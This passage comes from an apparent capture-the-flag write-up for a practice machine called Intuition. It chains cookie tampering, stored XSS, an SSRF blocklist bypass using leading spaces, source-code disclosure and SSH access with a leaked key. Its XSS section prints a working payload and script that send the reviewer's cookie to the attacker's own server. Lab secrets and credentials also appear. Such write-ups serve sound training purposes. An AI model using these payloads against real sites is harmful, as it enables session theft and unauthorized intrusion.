&lt;..SNIP..&gt;
</code></pre>

<p>With whatweb, more the same:</p>

<pre><code class="language-bash">❯ whatweb http://report.comprezzor.htb
http://report.comprezzor.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[support@comprezzor.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.15], Script, Title[Report - Comprezzor], nginx[1.18.0]
</code></pre>

<p>Looking in the browser, I can see it’s a report submission page to report bugs as said in comprezzor.htb:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906182838.png" alt="" /></p>

<p>Before reporting something I will take a look at the link that says “See exactly what happens to your report from here” to see exactly what happens to my report:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906183112.png" alt="" /></p>

<p>It says two important things:</p>
<ul>
  <li>It’s reviewed by skilled developers</li>
  <li>If a bug seems important, the admins will review it</li>
</ul>

<p>The “Report a Bug” button of before redirects to auth.comprezzor.htb/login, which I don’t have in the /etc/hosts, so I will add it:</p>

<pre><code class="language-bash">10.10.11.15 comprezzor.htb report.comprezzor.htb auth.comprezzor.htb
</code></pre>

<p>Now I can successfully go to that page, which says that to access that page (Report bug page), I need to login:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906183834.png" alt="" /></p>

<p>I don’t have any credentials, so I will register an account with username “gabri” and password “gabri123$!” and login:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906183958.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906184039.png" alt="" /></p>

<p>The cookie it sets is in base64:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906184154.png" alt="" /></p>

<p>And I can decode it:</p>

<pre><code class="language-bash">❯ echo -n 'eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImdhYnJpIiwgInJvbGUiOiAidXNlciJ9fDFkOWQ1NzIxNjkxODg1ODY0YTNhNmU3OTU0NTAxZGNjZmYzZTk0MjE1M2FlNTY5MmJhZDRmM2RmM2U1NzQwMDE=' | base64 -d; echo
{"user_id": 6, "username": "gabri", "role": "user"}|1d9d5721691885864a3a6e7954501dccff3e942153ae5692bad4f3df3e574001
</code></pre>

<p>It has the user_id, username, role and a random string which I don’t know what it is for. This seems vulnerable so I will try changing my role to admin and setting that cookie in the browser:</p>

<pre><code class="language-bash">❯ echo -n '{"user_id": 6, "username": "gabri", "role": "admin"}|1d9d5721691885864a3a6e7954501dccff3e942153ae5692bad4f3df3e574001' | base64 -w 0;echo
eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogImdhYnJpIiwgInJvbGUiOiAiYWRtaW4ifXwxZDlkNTcyMTY5MTg4NTg2NGEzYTZlNzk1NDUwMWRjY2ZmM2U5NDIxNTNhZTU2OTJiYWQ0ZjNkZjNlNTc0MDAx
</code></pre>

<p>It seems to work:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906184534.png" alt="" /></p>

<p>But I don’t have any admin functionality available and fuzzing routes doesn’t gives anything:</p>
<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://report.comprezzor.htb/FUZZ -mc all -fc 404 -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://report.comprezzor.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

:: Progress: [119600/119600] :: Job [1/1] :: 193 req/sec :: Duration: [0:11:45] :: Errors: 0 ::
</code></pre>

<p>So I will fuzz subdomains:</p>

<pre><code class="language-bash">❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.comprezzor.htb" -u http://comprezzor.htb -mc all -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://comprezzor.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 41ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 40ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 40ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1063 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
</code></pre>

<p>I can see the new dashboard subdomain so I will add it to my /etc/hosts.
But it gives “Internal Server Error”:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906200532.png" alt="" /></p>

<p>So I will restore my original cookie and it says “Not enough permissions”, so it is 100% the admin’s dashboard:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906200621.png" alt="" /></p>

<p>The only thing left is reporting a bug with a HTML payload that loads an non-existing image in my webserver to see if the panel of the one that reviews my reports is vulnerable to html injection:</p>

<pre><code class="language-bash">❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906191716.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906191914.png" alt="" /></p>

<p>And I receive requests confirming that both fields are vulnerable:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906191955.png" alt="" /></p>
    
      <h1 id="xss">
        
        
          XSS <a href="#xss" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>
<p>Now that I have confirmed an HTML injection vulnerability, I can try to do various things in the session of the one that reviews my reports using javascript. If the cookie doesn’t have HttpOnly enabled, I can access it with javascript and in consequence exfiltrate it in my server. This is the case:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906192230.png" alt="" /></p>

<p>So I will create a javascript file that takes the cookie and sends it to my server that will interpret in the victim’s dashboard. This is the javascript file:</p>

<pre><code class="language-javascript">var req = new XMLHttpRequest();
req.open("GET", "http://10.10.15.95/exfil?cookie=" + encodeURIComponent(btoa(document.cookie)), false);
req.send();
</code></pre>

<p>Now I will start the http server and send the payload <code>&lt;img src=x onerror="eval('d=document; _=d.createElement(\'script\');_.src=\'http://10.10.15.95/script.js\';d.body.appendChild(_)')"&gt;</code> that will create a script element in the victim’s dashboard and load my remote script:</p>

<pre><code class="language-bash">❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906202602.png" alt="" /></p>

<p>And I receive a request from 10.10.11.15 with the cookie url-encoded and base64-encoded:
<img src="/assets/images/Intuition/Pasted%20image%2020240910201921.png" alt="" /></p>

<p>I will decode it and see the cookie:</p>

<pre><code class="language-bash">❯ encoded_cookie="dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNaXdnSW5WelpYSnVZVzFsSWpvZ0ltRmtZVzBpTENBaWNtOXNaU0k2SUNKM1pXSmtaWFlpZlh3MU9HWTJaamN5TlRNek9XTmxNMlkyT1dRNE5UVXlZVEV3TmprMlpHUmxZbUkyT0dJeVlqVTNaREpsTlRJell6QTRZbVJsT0RZNFpETmhOelUyWkdJNA%3D%3D"
❯ php -r "echo urldecode('$encoded_cookie');" | base64 -d; echo
user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
</code></pre>

<p>It’s of “adam” user with “webdev” role:</p>

<pre><code class="language-bash">❯ echo -n 'eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4' | base64 -d; echo
{"user_id": 2, "username": "adam", "role": "webdev"}|58f6f725339ce3f69d8552a10696ddebb68b2b57d2e523c08bde868d3a756db8
</code></pre>

<p>I will modify it in the browser and see I have access to dashboard.comprezzor.htb and I can see all the reports:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906200908.png" alt="" /></p>
    
      <h1 id="xss-2-admin-cookie">
        
        
          XSS 2 (admin cookie) <a href="#xss-2-admin-cookie" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>In the reports, I can see the ID, username who reported it, the title and priority. Then,  I remembered the link that talked about what exactly happens with the reports. If it’s too important, it will be reviewed by the administrator. There is a “Set high priority button” in the view report page:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906201452.png" alt="" /></p>

<p>I have access as adam, but not as administrator. I will do the same XSS as before but later, clicking on “Set High Priority”. I will do it with adam’s account:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906202406.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906201816.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906202719.png" alt="" /></p>

<p>And my last received cookie is different:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906202919.png" alt="" /></p>

<p>I will decode it and notice that it’s from admin:</p>

<pre><code class="language-bash">❯ encoded_cookie="dXNlcl9kYXRhPWV5SjFjMlZ5WDJsa0lqb2dNU3dnSW5WelpYSnVZVzFsSWpvZ0ltRmtiV2x1SWl3Z0luSnZiR1VpT2lBaVlXUnRhVzRpZlh3ek5EZ3lNak16TTJRME5EUmhaVEJsTkRBeU1tWTJZMk0yTnpsaFl6bGtNalprTVdReFpEWTRNbU0xT1dNMk1XTm1ZbVZoTWpsa056YzJaRFU0T1dRNQ%3D%3D"
❯ php -r "echo urldecode('$encoded_cookie');" | base64 -d; echo
user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</code></pre>

<pre><code class="language-bash">❯ echo -n 'eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5' | base64 -d; echo
{"user_id": 1, "username": "admin", "role": "admin"}|34822333d444ae0e4022f6cc679ac9d26d1d1d682c59c61cfbea29d776d589d9
</code></pre>

<p>So I will introduce it in the browser and I have access to new functionalities:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203144.png" alt="" /></p>
    
      <h1 id="admin-dashboard-enumeration">
        
        
          Admin dashboard enumeration <a href="#admin-dashboard-enumeration" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>The “Full report list” link gives the list of all the reports, nothing interesting:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203429.png" alt="" /></p>

<p>The “Create a backup” button just says that the backup was completed and it doesn’t gives any more information:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203538.png" alt="" /></p>

<p>In last place, the “Create PDF Report” link seems to be a Create PDF tool from an URL:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203640.png" alt="" /></p>

<p>I will introduce mine and see what happens:</p>

<pre><code class="language-bash">❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</code></pre>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203756.png" alt="" /></p>

<p>It just gives me the pdf of the html of the page:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906203832.png" alt="" /></p>
    
      <h1 id="ssrf">
        
        
          SSRF <a href="#ssrf" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>I will create a flask server in order to print the request headers and try to identify which technologies is using the “Create PDF report” page:</p>

<pre><code class="language-python">from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    print(f"\n[+] Request headers:\n\n{request.headers}")
    return ""

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)

</code></pre>

<pre><code class="language-bash">❯ python3 pdfTestServer.py
 * Serving Flask app 'pdfTestServer'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.1.3:80
Press CTRL+C to quit
</code></pre>

<p>It’s using urllib 3.11:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906204218.png" alt="" /></p>

<p>Looking for schemas available for this library, I can see it supports a bunch of interesting ones like “file:///”, “ftp://”, “gopher://”, etc:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906204827.png" alt="" /></p>

<p>But for example <code>file:///</code> is restricted:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910202515.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240910202527.png" alt="" /></p>

<p>Searching for vulnerabilities of this version of urllib, I saw <a href="https://vsociety.medium.com/cve-2023-24329-bypassing-url-blackslisting-using-blank-in-python-urllib-library-ee438679351d">CVE-2023–24329</a>, which consists on that an attacker may be able to bypass blacklists using blank characters at the beginning of the url:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906204930.png" alt="" /></p>

<p>So if I put it with spaces at the beginning (“  file:///etc/passwd”), I can successfully bypass it and see /etc/passwd of the server:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906205345.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906205404.png" alt="" /></p>
    
      <h1 id="source-code-analysis">
        
        
          Source code analysis <a href="#source-code-analysis" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>Looking at which command runs this webapp (/proc/self/cmdline), I can see it’s a python server located in /app/code/app.py:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906211259.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906211306.png" alt="" /></p>

<p>So I will look at its source code:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906211638.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240906211739.png" alt="" /></p>

<p>It’s very uncomfortable to inspect it like this but I can open it with visual studio code and more or less put the code in a better way:</p>

<pre><code class="language-python">from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp
  
app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024
  
# Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}
  
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')
  
if __name__ == '__main__':
	app.run(debug=False, host="0.0.0.0", port=80)
</code></pre>

<p>I can see the secret key but is not useful by now because I have access as admin. Another thing to see is that it’s importing the functionality for each subdomain using blueprints. In python, when importing things in the current directory, ‘.’ are like ‘/’ to specify where is located the script. I will start by looking at the blueprints.auth.auth as it’s the most interesting:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909120803.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909120851.png" alt="" /></p>

<p>This is the beautified code:</p>

<pre><code class="language-python">from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response
from .auth_utils import *
from werkzeug.security import check_password_hash

app = Flask(__name__)
auth_bp = Blueprint('auth', __name__, subdomain='auth')

@auth_bp.route('/')
def index():
    return redirect(url_for('auth.login'))

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if (user is None) or not check_password_hash(user[2], password):
            flash('Invalid username or password', 'error')
            return redirect(url_for('auth.login'))
        serialized_user_data = serialize_user_data(user[0], user[1], user[3])
        flash('Logged in successfully!', 'success')
        response = make_response(redirect(get_redirect_url(user[3])))
        response.set_cookie('user_data', serialized_user_data, domain='.comprezzor.htb')
        return response
    return render_template('auth/login.html')

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        
        if user is not None:
            flash('User already exists', 'error')
            return redirect(url_for('auth.register'))
        
        if create_user(username, password):
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('auth.login'))
        else:
            flash('Unexpected error occured while trying to register!', 'error')
            return render_template('auth/register.html')

@auth_bp.route('/logout')
def logout():
    pass
</code></pre>

<p>That are the handlers for login, register and logout. I can see that is using a lot of functionalities like create_user, serialize_user_data, fetch_user_info that are probably stored in auth_utils.py (<code>from .auth_utils import *</code>), so I will also download it:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909122404.png" alt="" /></p>

<p>And this is the code:</p>

<pre><code class="language-python">import sqlite3, os, base64, json, hmac, hashlib 
from werkzeug.security import generate_password_hash 
from functools import wraps 
from flask import flash, url_for, redirect, request 

SECRET_KEY = 'JS781FJS07SMSAH27SG'
USER_DB_FILE = os.path.join(os.path.dirname(__file__), 'users.db') 

def fetch_user_info(username): 
    with sqlite3.connect(USER_DB_FILE) as conn: 
        cursor = conn.cursor() 
        cursor.execute('SELECT * FROM users WHERE username = ?', (username,)) 
        user = cursor.fetchone() 
        if not user: 
            return None 
        else: return user 

def create_user(username, password, role='user'): 
    try: 
        with sqlite3.connect(USER_DB_FILE) as conn: 
            cursor = conn.cursor() 
            cursor.execute('INSERT INTO users (username, password, role) VALUES (?,?,?)', (username,generate_password_hash(password,'sha256'), role)) 
            conn.commit() 
            return True 
    except Exception as e: 
        return False 
    
def serialize_user_data(user_id, username, role): 
    data = { 'user_id': user_id, 'username': username, 'role': role }
    serialized_data = json.dumps(data).encode('utf-8') 
    signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest() 
    return base64.b64encode(serialized_data + b'|' + signature.encode('utf-8')).decode('utf-8')

def deserialize_user_data(serialized_data): 
    serialized_data = base64.b64decode(serialized_data) 
    serialized_data,received_signature = serialized_data.rsplit(b'|', 1) 
    expected_signature = hmac.new(SECRET_KEY.encode('utf-8'), serialized_data, hashlib.sha256).hexdigest() 
    if hmac.compare_digest(expected_signature.encode('utf-8'), received_signature): 
        decoded_data = serialized_data.decode('utf-8') 
        return json.loads(decoded_data) 
    else: 
        return None

def get_redirect_url(user_role): 
    if user_role == 'user': 
        return url_for('report.report_index') 
    else: 
        return url_for('dashboard.dashboard') 

def admin_required(view_func): 
    @wraps(view_func)
    def decorated_view(*args, **kwargs): 
        user_data = request.cookies.get('user_data') 
        if not user_data: 
            flash('You need to log in to access this page.', 'error') 
            return redirect(url_for('auth.login'))
        user_info = deserialize_user_data(user_data) 
        if user_info['role'] not in ['admin', 'webdev']: 
            flash('Not enough permissions. Login as an administrator user to access this resource', 'error')
            return redirect(url_for('auth.login')) 
        return view_func(*args, **kwargs) 
    return decorated_view 

def login_required(view_func): 
    @wraps(view_func) 
    def decorated_view(*args, **kwargs): 
        user_data = request.cookies.get('user_data') 
        if not user_data: 
            flash('You need to log in to access this page.', 'error') 
            return redirect(url_for('auth.login')) 
        return view_func(*args, **kwargs) 
    return decorated_view
</code></pre>

<p>It seems like there is a users.db file in the current directory but it’s not the case. Now I will look at blueprints.dashboard.dashboard, which has a bunch of code:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909124242.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909124302.png" alt="" /></p>

<p>This is the code:</p>

<pre><code class="language-python">from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file 
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data 
from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report 
import random, os, pdfkit, socket, shutil
import urllib.request 
from urllib.parse import urlparse 
import zipfile 
from ftplib import FTP 
from datetime import datetime 

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard') 

pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports') 
allowed_hostnames = ['report.comprezzor.htb'] 

@dashboard_bp.route('/', methods=['GET'])
@admin_required 
def dashboard(): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] == 'admin': 
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev': 
        reports = get_all_reports() 
        return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info) 

@dashboard_bp.route('/report/', methods=['GET']) 
@login_required 
def get_report(report_id): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id) 
        return render_template('dashboard/report.html', report=report, user_info=user_info) 
    else: 
        pass 

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required 
def del_report(report_id): 
    user_data = request.cookies.get('user_data') 
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] in ['admin', 'webdev']: 
        report = delete_report(report_id) 
        return redirect(url_for('dashboard.dashboard')) 
    else: 
        pass 

@dashboard_bp.route('/resolve', methods=['POST']) 
@login_required 
def resolve(): 
    report_id = int(request.args.get('report_id')) 
    if resolve_report(report_id): 
        flash('Report resolved successfully!', 'success') 
    else: 
        flash('Error occurred while trying to resolve!', 'error') 
    
    return redirect(url_for('dashboard.dashboard')) 

@dashboard_bp.route('/change_priority', methods=['POST']) 
@admin_required 
def change_priority(): 
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data) 
    if user_info['role'] != ('webdev' or 'admin'): 
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error') 
        return redirect(url_for('dashboard.dashboard')) 
    report_id = int(request.args.get('report_id')) 
    priority_level = int(request.args.get('priority_level')) 
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success') 
    else: 
        flash('Error occurred while trying to change the priority!', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST']) 
@admin_required 
def create_pdf_report(): 
    global pdf_report_path 
    if request.method == 'POST': 
        report_url = request.form.get('report_url') 
        try: 
            scheme = urlparse(report_url).scheme 
            hostname = urlparse(report_url).netloc 
            try: 
                dissallowed_schemas = ["file", "ftp", "ftps"] 
                if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)): 
                    print(scheme) 
                    urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                    response = urllib.request.urlopen(urllib_request) 
                    html_content = response.read().decode('utf-8') 
                    pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                    pdfkit.from_string(html_content, pdf_filename) 
                    return send_file(pdf_filename, as_attachment=True) 
            except: 
                flash('Unexpected error!', 'error') 
                return render_template('dashboard/create_pdf_report.html') 
            else: 
                flash('Invalid URL', 'error') 
                return render_template('dashboard/create_pdf_report.html') 
        except Exception as e: 
            raise e 
    else: 
        return render_template('dashboard/create_pdf_report.html') 

@dashboard_bp.route('/backup', methods=['GET']) 
@admin_required 
def backup(): 
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../') 
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") 
    backup_filename = f'app_backup_{current_datetime}.zip'
    
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: 
        for root, _, files in os.walk(source_directory): 
            for file in files: 
                file_path = os.path.join(root, file) 
                arcname = os.path.relpath(file_path, source_directory) 
                zipf.write(file_path, arcname=arcname) 
                try: 
                    ftp = FTP('ftp.local') 
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2') 
                    ftp.cwd('/') 
                    with open(backup_filename, 'rb') as file: 
                        ftp.storbinary(f'STOR {backup_filename}', file) 
                        ftp.quit() 
                        os.remove(backup_filename) 
                        flash('Backup and upload completed successfully!', 'success') 
                except Exception as e: 
                    flash(f'Error: {str(e)}', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))
</code></pre>

<p>The <code>/backup</code> handler is interesting because it logins to the ftp server using hardcoded credentials and uploads some files of the source:</p>

<pre><code class="language-python">@dashboard_bp.route('/backup', methods=['GET']) 
@admin_required 
def backup(): 
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../') 
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") 
    backup_filename = f'app_backup_{current_datetime}.zip'
    
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: 
        for root, _, files in os.walk(source_directory): 
            for file in files: 
                file_path = os.path.join(root, file) 
                arcname = os.path.relpath(file_path, source_directory) 
                zipf.write(file_path, arcname=arcname) 
                try: 
                    ftp = FTP('ftp.local') 
                    ftp.login(user='ftp_admin', passwd='u3jai8y71s2') 
                    ftp.cwd('/') 
                    with open(backup_filename, 'rb') as file: 
                        ftp.storbinary(f'STOR {backup_filename}', file) 
                        ftp.quit() 
                        os.remove(backup_filename) 
                        flash('Backup and upload completed successfully!', 'success') 
                except Exception as e: 
                    flash(f'Error: {str(e)}', 'error') 
    
    return redirect(url_for('dashboard.dashboard'))
</code></pre>
    
      <h1 id="access-as-dev_acc">
        
        
          Access as dev_acc <a href="#access-as-dev_acc" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>As I have this ssrf that supports a lot of schemes, I can connect to the ftp server and see what it has inside:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130152.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130206.png" alt="" /></p>

<p>There are private-8297.key, welcome_note.pdf and welcome_note.txt files. Let’s see welcome_note.txt:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130309.png" alt="" /></p>

<p>It says the passphrase for that private key:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130651.png" alt="" /></p>

<p>I will dump the private key in a file called privkey:</p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130802.png" alt="" /></p>

<p><img src="/assets/images/Intuition/Pasted%20image%2020240909130820.png" alt="" /></p>

<p>If I try changing the comment, I can see it has a comment “dev_acc@local”, which seems like a user:</p>

<pre><code class="language-bash">❯ ssh-keygen -c -f privkey
Enter passphrase: Y27SH19HDIWD
Old comment: dev_acc@local
</code></pre>

<p>Now, I can login to ssh with that user:</p>

<pre><code class="language-bash">❯ ssh -i privkey dev_acc@10.10.11.15
Enter passphrase for key 'privkey': Y27SH19HDIWD
dev_acc@intuition:~$ 
</code></pre>

<p>And user.txt is available in home’s directory:</p>

<pre><code class="language-bash">dev_acc@intuition:~$ ls -l
total 4
-rw-r----- 1 root dev_acc 33 Sep  9 04:06 user.txt
dev_acc@intuition:~$ cat user.txt 
32****************************f1
</code></pre>
    
      <h1 id="ftp-access-as-adam">
        
        
          FTP access as adam <a href="#ftp-access-as-adam" class="anchor"><i class='fa fa-link' aria-hidden='true'></i></a>
        
        
      </h1>

<p>There is a users.db located in /var/www/app/blueprints/auth:</p>

<pre><code class="language-bash">dev_acc@intuition:/var/www/app$ find . -type f | grep -vE '__pycache__|\.html$'
./app.py
./blueprints/auth/auth_utils.py
./blueprints/auth/users.sql
./blueprints/auth/users.db
./blueprints/auth/auth.py
./blueprints/report/report_utils.py
./blueprints/report/report.py
./blueprints/report/reports.db
./blueprints/report/reports.sql
./blueprints/dashboard/dashboard.py
./blueprints/index/index.py
</code></pre>

<p>And I can dump the users hashes:</p>

<pre><code class="language-bash">dev_acc@intuition:/var/www/app$ sqlite3 blueprints/auth/users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite&gt; .tables
users
sqlite&gt; pragma table_info(users);
0|id|INTEGER|0||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|role|TEXT|0|'user'|0
